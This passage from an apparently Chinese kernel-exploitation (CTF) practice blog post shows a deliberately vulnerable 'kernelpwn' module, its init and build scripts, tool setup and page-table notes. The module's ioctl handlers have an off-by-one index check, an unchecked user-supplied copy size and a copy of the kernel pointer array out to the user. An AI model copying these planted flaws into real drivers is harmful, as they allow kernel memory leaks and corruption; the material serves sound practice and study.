</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">show</span><span class="p">(</span><span class="k">struct</span> <span class="n">show_args</span> <span class="o">*</span><span class="n">args</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="n">idx</span> <span class="o">=</span> <span class="n">args</span><span class="o">-&gt;</span><span class="n">idx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">idx</span> <span class="o">&gt;</span> <span class="mh">0x1000</span> <span class="o">||</span> <span class="o">!</span><span class="n">addrList</span><span class="p">[</span><span class="n">idx</span><span class="p">]){</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">addrList</span><span class="p">[</span><span class="n">idx</span><span class="p">],</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nf">copy_to_user</span><span class="p">(</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">list_chunk</span><span class="p">(</span><span class="k">struct</span> <span class="n">show_args</span> <span class="o">*</span><span class="n">args</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x2000</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="n">idx</span> <span class="o">=</span> <span class="n">args</span><span class="o">-&gt;</span><span class="n">idx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">idx</span> <span class="o">&gt;</span> <span class="mh">0x1000</span> <span class="o">||</span> <span class="o">!</span><span class="n">addrList</span><span class="p">[</span><span class="n">idx</span><span class="p">]){</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="o">&amp;</span><span class="n">addrList</span><span class="p">,</span><span class="mh">0x2000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nf">copy_to_user</span><span class="p">(</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">long</span> <span class="nf">kernel_ioctl</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">arg</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">switch</span><span class="p">(</span><span class="n">cmd</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">ADD</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">long</span> <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EINVAL</span> <span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">struct</span> <span class="n">add_args</span> <span class="n">a1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nf">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">a1</span><span class="p">,(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">a1</span><span class="p">))){</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">ret</span> <span class="o">=</span> <span class="nf">add</span><span class="p">(</span><span class="o">&amp;</span><span class="n">a1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>           
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">DEL</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">long</span> <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EINVAL</span> <span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">struct</span> <span class="n">del_args</span> <span class="n">a2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nf">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">a2</span><span class="p">,(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">a2</span><span class="p">))){</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">ret</span> <span class="o">=</span> <span class="nf">del</span><span class="p">(</span><span class="o">&amp;</span><span class="n">a2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">SHOW</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">long</span> <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EINVAL</span> <span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">struct</span> <span class="n">show_args</span> <span class="n">a3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nf">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">a3</span><span class="p">,(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">a3</span><span class="p">))){</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">ret</span> <span class="o">=</span> <span class="nf">show</span><span class="p">(</span><span class="o">&amp;</span><span class="n">a3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">EDIT</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">long</span> <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EINVAL</span> <span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">struct</span> <span class="n">edit_args</span> <span class="n">a4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nf">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">a4</span><span class="p">,(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">a4</span><span class="p">))){</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">ret</span> <span class="o">=</span> <span class="nf">edit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">a4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">LIST</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">long</span> <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EINVAL</span> <span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">struct</span> <span class="n">show_args</span> <span class="n">a5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nf">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">a5</span><span class="p">,(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">a5</span><span class="p">))){</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">ret</span> <span class="o">=</span> <span class="nf">list_chunk</span><span class="p">(</span><span class="o">&amp;</span><span class="n">a5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">ADDO</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">long</span> <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EINVAL</span> <span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">struct</span> <span class="n">add_args</span> <span class="n">a1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nf">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">a1</span><span class="p">,(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">a1</span><span class="p">))){</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">ret</span> <span class="o">=</span> <span class="nf">add_only</span><span class="p">(</span><span class="o">&amp;</span><span class="n">a1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">ADDA</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">long</span> <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EINVAL</span> <span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">struct</span> <span class="n">add_args</span> <span class="n">a1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nf">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">a1</span><span class="p">,(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">a1</span><span class="p">))){</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">ret</span> <span class="o">=</span> <span class="nf">add_account</span><span class="p">(</span><span class="o">&amp;</span><span class="n">a1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>  
</span></span><span class="line"><span class="cl">        <span class="k">default</span><span class="o">:</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">long</span> <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">kernel_release</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mh">0x1000</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="n">addrList</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="n">fops</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">owner</span> <span class="o">=</span> <span class="n">THIS_MODULE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">open</span> <span class="o">=</span>      <span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">release</span> <span class="o">=</span>   <span class="n">kernel_release</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">read</span> <span class="o">=</span>      <span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">write</span> <span class="o">=</span>     <span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">unlocked_ioctl</span> <span class="o">=</span> <span class="n">kernel_ioctl</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="k">struct</span> <span class="n">miscdevice</span> <span class="n">misc</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">minor</span> <span class="o">=</span> <span class="n">MISC_DYNAMIC_MINOR</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">name</span>  <span class="o">=</span> <span class="s">&#34;kernelpwn&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">fops</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fops</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">kernel_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">misc_register</span><span class="p">(</span><span class="o">&amp;</span><span class="n">misc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">cache</span> <span class="o">=</span>  <span class="nf">kmem_cache_create</span><span class="p">(</span><span class="s">&#34;my_struct&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">              <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">my_struct</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">              <span class="n">SLAB_HWCACHE_ALIGN</span> <span class="o">|</span> <span class="n">SLAB_PANIC</span> <span class="o">|</span> <span class="n">SLAB_ACCOUNT</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">              <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">kernel_exit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">&#34;Goodbye hackern&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">misc_deregister</span><span class="p">(</span><span class="o">&amp;</span><span class="n">misc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">module_init</span><span class="p">(</span><span class="n">kernel_init</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">module_exit</span><span class="p">(</span><span class="n">kernel_exit</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_AUTHOR</span><span class="p">(</span><span class="s">&#34;NIRUGIRI&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_LICENSE</span><span class="p">(</span><span class="s">&#34;GPL&#34;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="init">init</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl">mkdir /tmp
</span></span><span class="line"><span class="cl">mount -t proc none /proc
</span></span><span class="line"><span class="cl">mount -t sysfs none /sys
</span></span><span class="line"><span class="cl">mount -t debugfs none /sys/kernel/debug
</span></span><span class="line"><span class="cl">mount -t devtmpfs devtmpfs /dev
</span></span><span class="line"><span class="cl">mount -t tmpfs none /tmp
</span></span><span class="line"><span class="cl">mdev -s
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s2">&#34;Boot took </span><span class="k">$(</span>cut -d<span class="s1">&#39; &#39;</span> -f1 /proc/uptime<span class="k">)</span><span class="s2"> seconds&#34;</span>
</span></span><span class="line"><span class="cl">chown root:root /*
</span></span><span class="line"><span class="cl">chown root:root .
</span></span><span class="line"><span class="cl">chmod <span class="m">755</span> .
</span></span><span class="line"><span class="cl">chmod <span class="m">755</span> /*
</span></span><span class="line"><span class="cl">chmod <span class="m">600</span> /flag
</span></span><span class="line"><span class="cl">chmod <span class="m">777</span> /tmp
</span></span><span class="line"><span class="cl">insmod /4.ko
</span></span><span class="line"><span class="cl">chmod <span class="m">666</span> /dev/kernelpwn
</span></span><span class="line"><span class="cl">chmod <span class="m">740</span> /flag
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/kernel/kptr_restrict
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/kernel/dmesg_restrict
</span></span><span class="line"><span class="cl">chmod <span class="m">400</span> /proc/kallsyms
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">poweroff -d <span class="m">120</span> -f <span class="p">&amp;</span>
</span></span><span class="line"><span class="cl">setsid /bin/cttyhack setuidgid <span class="m">1000</span> /bin/sh
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">umount /proc
</span></span><span class="line"><span class="cl">umount /tmp
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">poweroff -d <span class="m">0</span>  -f
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="makefile">makefile</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Makefile" data-lang="Makefile"><span class="line"><span class="cl"><span class="nv">obj-m</span> <span class="o">:=</span> 1.o
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">KERNELDR</span> <span class="o">:=</span> /home/ubuntu/kernel/linux-6.4/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">PWD</span> <span class="o">:=</span> <span class="k">$(</span>shell <span class="nb">pwd</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">modules</span><span class="o">:</span>  
</span></span><span class="line"><span class="cl">	<span class="k">$(</span>MAKE<span class="k">)</span> -C <span class="k">$(</span>KERNELDR<span class="k">)</span> <span class="nv">M</span><span class="o">=</span><span class="k">$(</span>PWD<span class="k">)</span> modules
</span></span><span class="line"><span class="cl"><span class="nf">moduels_install</span><span class="o">:</span>  
</span></span><span class="line"><span class="cl">	<span class="k">$(</span>MAKE<span class="k">)</span> -C <span class="k">$(</span>KERNELDR<span class="k">)</span> <span class="nv">M</span><span class="o">=</span><span class="k">$(</span>PWD<span class="k">)</span> modules_install
</span></span><span class="line"><span class="cl"><span class="nf">clean</span><span class="o">:</span>  
</span></span><span class="line"><span class="cl">	rm -rf *.o *~  .depend .*.cmd *.mod *.mod.c .tmp_versions *.order Module.*
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="expsh">exp.sh</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/bin/sh
</span></span><span class="line"><span class="cl">musl-gcc <span class="nv">$1</span> -static -lpthread -o exp <span class="o">&amp;&amp;</span> find . <span class="p">|</span> cpio -o --format<span class="o">=</span>newc &gt; ../rootfs.img <span class="o">&amp;&amp;</span> <span class="nb">cd</span> .. <span class="o">&amp;&amp;</span> ./start.sh
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Gdb:      9.2
</span></span><span class="line"><span class="cl">Python:   3.8.10 (default, May 26 2023, 14:05:08)  [GCC 9.4.0]
</span></span><span class="line"><span class="cl">Pwndbg:   2023.07.17 build: c370306
</span></span><span class="line"><span class="cl">Capstone: 5.0.1280
</span></span><span class="line"><span class="cl">Unicorn:  2.0.1
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="常用工具">常用工具</h1>
<h2 id="vmlinux-to-elf">vmlinux-to-elf</h2>
<p>用来将 bzImage 转化为 vmlinux</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt install python3-pip liblzo2-dev
</span></span><span class="line"><span class="cl">sudo pip3 install --upgrade lz4 zstandard git+https://github.com/clubby789/python-lzo@b4e39df
</span></span><span class="line"><span class="cl">sudo pip3 install --upgrade git+https://github.com/marin-m/vmlinux-to-elf
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pahole">pahole</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt install pahole
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="需要掌握的知识">需要掌握的知识</h1>
<h2 id="页表解析">页表解析</h2>
<p>vmemmap_base 是存放 page 结构体的基地址</p>
<p>page_offset_base: 是线性映射区的基地址 可以理解为内核堆栈代码段等的基地址</p>
<p>物理地址 + page_offset_base = 线性映射区地址</p>
<p>pgd-&gt; pud-&gt; pmd 里面存放的是物理地址</p>
<p>pte 里面存放的可能是数据也可能是地址 取决于 pte 属于什么段，如果是数据段里面的存放的就是数据或者代码。如果是 mmap 则存放的是物理地址</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">ffff888000000000</span> <span class="o">|</span> <span class="o">-</span><span class="mf">119.5</span>  <span class="n">TB</span> <span class="o">|</span> <span class="n">ffffc87fffffffff</span> <span class="o">|</span>   <span class="mi">64</span> <span class="n">TB</span> <span class="o">|</span> <span class="n">direct</span> <span class="n">mapping</span> <span class="n">of</span> <span class="n">all</span> <span class="n">physical</span> <span class="nf">memory</span> <span class="p">(</span><span class="n">page_offset_base</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>pgd = task_struct-&gt; mm_struct-&gt; pgd 来获取</p>
<h3 id="task_struct">task_struct</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">   1
</span><span class="lnt">   2
</span><span class="lnt">   3
</span><span class="lnt">   4
</span><span class="lnt">   5
</span><span class="lnt">   6
</span><span class="lnt">   7
</span><span class="lnt">   8
</span><span class="lnt">   9
</span><span class="lnt">  10
</span><span class="lnt">  11
</span><span class="lnt">  12
</span><span class="lnt">  13
</span><span class="lnt">  14
</span><span class="lnt">  15
</span><span class="lnt">  16
</span><span class="lnt">  17
</span><span class="lnt">  18
</span><span class="lnt">  19
</span><span class="lnt">  20
</span><span class="lnt">  21
</span><span class="lnt">  22
</span><span class="lnt">  23
</span><span class="lnt">  24
